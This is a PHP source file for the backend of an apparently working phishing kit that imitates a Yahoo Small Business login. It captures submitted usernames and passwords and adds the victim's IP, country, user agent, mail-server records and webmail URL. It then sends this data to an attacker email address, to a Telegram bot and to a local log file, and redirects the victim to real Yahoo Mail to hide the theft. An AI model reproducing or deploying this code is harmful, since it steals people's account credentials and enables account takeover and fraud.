<?php 
header("Access-Control-Allow-Headers: Authorization, Content-Type");
header("Access-Control-Allow-Origin: *");
header('content-type: application/json; charset=utf-8');

// ==========================================
// Auto-detect and load config.php
// ==========================================
function loadConfig() {
    // Possible paths to check for config.php
    $possiblePaths = [
        __DIR__ . '/config.php',           // Same directory
        dirname(__DIR__) . '/config.php',  // Parent directory
        __DIR__ . '/../config.php',        // One level up
        __DIR__ . '/../../config.php',     // Two levels up
        $_SERVER['DOCUMENT_ROOT'] . '/config.php', // Document root
        $_SERVER['DOCUMENT_ROOT'] . '/../config.php', // Above document root
        '/etc/config.php',                 // System-wide config
    ];

    foreach ($possiblePaths as $path) {
        if (file_exists($path)) {
            require_once $path;
            return true;
        }
    }

    // If config not found, try to find it recursively
    $dir = __DIR__;
    for ($i = 0; $i < 5; $i++) {
        $dir = dirname($dir);
        $configPath = $dir . '/config.php';
        if (file_exists($configPath)) {
            require_once $configPath;
            return true;
        }
    }

    return false;
}

// Load configuration
if (!loadConfig()) {
    // Fallback to hardcoded values if config not found
    define('EMAIL', 'email here');
    define('TG_TOKEN', 'enter token');
    define('TG_CHAT_ID', 'chat id');
    define('SUBMIT', '2');
}

// ==========================================
// Use configuration values
// ==========================================
$Receive_email = EMAIL;
$telegramBotToken = TG_TOKEN;
$telegramChatId = TG_CHAT_ID;
$submitLimit = defined('SUBMIT') ? SUBMIT : 2;

// ==========================================
// Session tracking for submission counting
// ==========================================
function getSessionIdentifier() {
    global $session_folder;
    
    if (isset($session_folder) && !empty($session_folder)) {
        return $session_folder;
    }
    
    // Generate a session ID based on IP and date
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    return md5($ip . date('Y-m-d'));
}

// Initialize session tracking
$sessionId = getSessionIdentifier();
$sessionFile = sys_get_temp_dir() . '/' . $sessionId . '_submissions.txt';

// Check submission count
$submissionCount = 0;
if (file_exists($sessionFile)) {
    $submissionCount = (int)file_get_contents($sessionFile);
}

// ==========================================
// Process the request
// ==========================================
$user = isset($_POST['user']) ? trim($_POST['user']) : '';
$pass = isset($_POST['pass']) ? trim($_POST['pass']) : '';
$userDomain = isset($_POST['userDomain']) ? trim($_POST['userDomain']) : '';

if ($pass != null) {
    // Check if submission limit is reached
    if ($submissionCount >= $submitLimit) {
        // Still redirect but don't log/send
        header("Location: https://us-mg5.mail.yahoo.com/neo/launch?reason=ignore&rs=1");
        exit();
    }
    
    // Increment submission count
    $submissionCount++;
    file_put_contents($sessionFile, $submissionCount);
    
    // ==========================================
    // Get additional information
    // ==========================================
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Get country based on IP with fallback
    $country = "Unknown";
    try {
        $countryData = @file_get_contents("https://ipapi.co/$ip/country_name/");
        if ($countryData !== false && !empty(trim($countryData))) {
            $country = trim($countryData);
        }
    } catch (Exception $e) {
        $country = "Unknown";
    }

    // Fallback to ip-api.com if ipapi.co fails
    if ($country === "Unknown") {
        $geoData = @file_get_contents("http://ip-api.com/json/$ip");
        if ($geoData !== false) {
            $geoJson = json_decode($geoData, true);
            if ($geoJson && isset($geoJson['status']) && $geoJson['status'] === 'success') {
                $country = $geoJson['country'] ?? 'Unknown';
            }
        }
    }

    // Extract email domain
    if (empty($userDomain) && strpos($user, '@') !== false) {
        $userDomain = substr(strrchr($user, "@"), 1);
    }

    // Get MX Record
    $mxRecords = @dns_get_record($userDomain, DNS_MX);
    $mxRecordString = "No MX Records Found";
    $webmailL0gin = "Not Available";
    
    if (!empty($mxRecords)) {
        $mxRecordString = implode(", ", array_column($mxRecords, 'target'));
        $mxDomain = $mxRecords[0]['target'];

        // Known mappings for email providers (including Yahoo specific)
        $webmailMapping = [
            // Yahoo-specific mappings
            'yahoo.com' => 'https://mail.yahoo.com',
            'yahoo.co.uk' => 'https://mail.yahoo.com',
            'yahoo.co.jp' => 'https://mail.yahoo.co.jp',
            'yahoo.ca' => 'https://mail.yahoo.com',
            'yahoo.com.au' => 'https://mail.yahoo.com',
            'yahoo.de' => 'https://mail.yahoo.com',
            'yahoo.fr' => 'https://mail.yahoo.com',
            'yahoo.es' => 'https://mail.yahoo.com',
            'yahoo.it' => 'https://mail.yahoo.com',
            'yahoo.com.mx' => 'https://mail.yahoo.com',
            'yahoo.com.br' => 'https://mail.yahoo.com',
            'yahoo.com.ar' => 'https://mail.yahoo.com',
            'yahoo.com.sg' => 'https://mail.yahoo.com',
            'yahoo.com.ph' => 'https://mail.yahoo.com',
            'yahoo.com.my' => 'https://mail.yahoo.com',
            'yahoo.co.id' => 'https://mail.yahoo.com',
            'yahoo.co.nz' => 'https://mail.yahoo.com',
            'yahoo.co.za' => 'https://mail.yahoo.com',
            'yahoo.co.il' => 'https://mail.yahoo.com',
            'yahoo.co.in' => 'https://mail.yahoo.com',
            'yahoo.com.hk' => 'https://mail.yahoo.com',
            'yahoo.com.tw' => 'https://mail.yahoo.com',
            'yahoo.com.kr' => 'https://mail.yahoo.com',
            
            // Yahoo Small Business specific
            'smallbusiness.yahoo.com' => 'https://smallbusiness.yahoo.com/business/email',
            'ymail.com' => 'https://mail.yahoo.com',
            'rocketmail.com' => 'https://mail.yahoo.com',
            'yahoo.com.cn' => 'https://mail.yahoo.com',
            'yahoo.com.vn' => 'https://mail.yahoo.com',
            'yahoo.com.ua' => 'https://mail.yahoo.com',
            'yahoo.com.tr' => 'https://mail.yahoo.com',
            'yahoo.com.pe' => 'https://mail.yahoo.com',
            'yahoo.com.pk' => 'https://mail.yahoo.com',
            'yahoo.com.ro' => 'https://mail.yahoo.com',
            
            // AT&T Yahoo
            'att.net' => 'https://currently.att.yahoo.com',
            'ameritech.net' => 'https://currently.att.yahoo.com',
            'bellsouth.net' => 'https://currently.att.yahoo.com',
            'flash.net' => 'https://currently.att.yahoo.com',
            'nvbell.net' => 'https://currently.att.yahoo.com',
            'pacbell.net' => 'https://currently.att.yahoo.com',
            'prodigy.net' => 'https://currently.att.yahoo.com',
            'sbcglobal.net' => 'https://currently.att.yahoo.com',
            'snet.net' => 'https://currently.att.yahoo.com',
            'swbell.net' => 'https://currently.att.yahoo.com',
            'wans.net' => 'https://currently.att.yahoo.com',
            
            // Top European email providers
            'mx.yandex.ru' => 'https://mail.yandex.com',
            'mx.mail.ru' => 'https://mail.ru',
            'mx.ukr.net' => 'https://mail.ukr.net',
            'mx.gmx.net' => 'https://mail.gmx.com',
            'mx.orange.fr' => 'https://webmail.orange.fr',
            'mx.protonmail.ch' => 'https://mail.proton.me',
            'mx.web.de' => 'https://web.de',
            'mx.vodafone.it' => 'https://mail.vodafone.it',
            'mx.libero.it' => 'https://mail.libero.it',
            'mx.tiscali.it' => 'https://mail.tiscali.it',

            // Turkish email providers
            'mx.turktelekom.com.tr' => 'https://webmail.turktelekom.com.tr',
            'mx.superonline.net' => 'https://mail.superonline.net',
            'mx.turk.net' => 'https://mail.turk.net',

            // Spanish email providers
            'mx.telefonica.net' => 'https://webmail.telefonica.net',
            'mx.movistar.es' => 'https://correo.movistar.es',

            // Brazilian email providers
            'mx.uol.com.br' => 'https://email.uol.com.br',
            'mx.terra.com.br' => 'https://webmail.terra.com.br',
            'mx.bol.com.br' => 'https://email.bol.com.br',

            // Generic mappings for international providers
            'stackmail.com' => 'https://stackmail.com',
            'ionos.com' => 'https://mail.ionos.com',
            'appsuite.com' => 'https://mail.appsuite.com',
            '1and1.com' => 'https://mail.ionos.com',
            'titan.email' => 'https://mail.titan.email',
            'zoho.com' => 'https://mail.zoho.com',
            'zoho.in' => 'https://mail.zoho.in',
            'zoho.eu' => 'https://mail.zoho.eu',
            'hostinger.com' => 'https://mail.hostinger.com',
            'secureserver.net' => 'https://email.godaddy.com',
            'google.com' => 'https://mail.google.com',
            'gmail.com' => 'https://mail.google.com',
            'mxhichina' => 'https://mail.mxhichina.com/alimail/',
            'emailsrvr.com' => 'https://apps.rackspace.com',
            'aruba.it' => 'https://webmail.aruba.it/',
        ];

        // Determine webmail L0gin URL
        if (strpos($mxDomain, 'natrohost.com') !== false) {
            $webmailL0gin = "https://mail." . $userDomain;
        } else {
            foreach ($webmailMapping as $key => $url) {
                if (strpos($mxDomain, $key) !== false) {
                    $webmailL0gin = $url;
                    break;
                }
            }
        }

        // Default to webmail.domain if no mapping is found
        if ($webmailL0gin === "Not Available") {
            $webmailL0gin = "https://webmail." . $userDomain;
        }
    }

    // ==========================================
    // Construct the message
    // ==========================================
    $message = "------------------------\n";
    $message .= "Page           : YAH00 SMALL BIZ\n";
    $message .= "usr            : $user\n";
    $message .= "Ps             : $pass\n";
    $message .= "Country        : $country\n";
    $message .= "Timestamp      : " . date("Y-m-d H:i:s") . "\n";
    $message .= "Hostname       : $hostname\n";
    $message .= "Webmail L0gin  : $webmailL0gin\n";
    $message .= "MX Records     : $mxRecordString\n";
    $message .= "----------------------------------\n";
    $message .= "IP             : $ip\n";
    $message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent     : $useragent\n";
    $message .= "Submission #   : $submissionCount of $submitLimit\n";
    $message .= "-----------------------\n";

    // ==========================================
    // Send the email with error suppression
    // ==========================================
    $subject = "$user | $country | $ip";
    @mail($Receive_email, $subject, $message);

    // ==========================================
    // Write to the text file with proper path handling
    // ==========================================
    $filePath = __DIR__ . "/d@main123.txt";
    if ($fileHandler = @fopen($filePath, "a")) {
        @fwrite($fileHandler, $message);
        @fclose($fileHandler);
    } else {
        error_log("Unable to write to file: $filePath");
    }

    // ==========================================
    // Send message to Telegram with error suppression
    // ==========================================
    $telegramMessage = urlencode($message);
    @file_get_contents("https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatId&text=$telegramMessage");

    // ==========================================
    // Response
    // ==========================================
    $signal = 'ok';
    $msg = 'Valid Credentials';
} else {
    $signal = 'error_log';
    $msg = 'Invalid Credentials';
}

// ==========================================
// Redirect to Yahoo Mail
// ==========================================
if (!empty($userDomain)) {
    // Check if it's a Yahoo domain
    $yahooDomains = ['yahoo.com', 'yahoo.co.uk', 'yahoo.co.jp', 'ymail.com', 'rocketmail.com', 
                     'att.net', 'ameritech.net', 'bellsouth.net', 'flash.net', 'nvbell.net', 
                     'pacbell.net', 'prodigy.net', 'sbcglobal.net', 'snet.net', 'swbell.net', 'wans.net'];
    
    $domainLower = strtolower($userDomain);
    $isYahoo = false;
    foreach ($yahooDomains as $yahooDomain) {
        if (strpos($domainLower, $yahooDomain) !== false) {
            $isYahoo = true;
            break;
        }
    }
    
    if ($isYahoo) {
        header("Location: https://us-mg5.mail.yahoo.com/neo/launch?reason=ignore&rs=1");
    } else {
        header("Location: https://mail.yahoo.com");
    }
} else {
    header("Location: https://us-mg5.mail.yahoo.com/neo/launch?reason=ignore&rs=1");
}
exit();
?>